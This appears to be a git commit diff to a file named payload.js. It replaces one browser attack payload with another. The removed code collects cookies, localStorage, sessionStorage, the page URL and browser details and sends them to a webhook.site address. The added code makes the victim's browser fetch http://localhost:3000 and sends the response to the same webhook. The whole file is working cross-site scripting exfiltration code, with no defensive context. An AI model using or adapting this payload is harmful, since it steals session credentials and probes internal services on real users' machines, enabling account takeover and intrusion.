5772a66cb9b954513499422f5ded3eb48be7a72c
Jesse228-web <chatgop112@gmail.com>
2026-02-19 15:45:01 +0000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,22 +1,8 @@
-
-new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?status=loaded&v=final';
-
-
-let data = {
-    url: window.location.href,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    referrer: document.referrer,
-    title: document.title,
-    domain: document.domain,
-    cookies: document.cookie
-};
-
-
-new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?data=' + encodeURIComponent(JSON.stringify(data));
-
-
-new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?debug=finish';
+fetch('http://localhost:3000')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?port3000=' + encodeURIComponent(data);
+  })
+  .catch(err => {
+    new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?port3000_err=' + err.message;
+  });
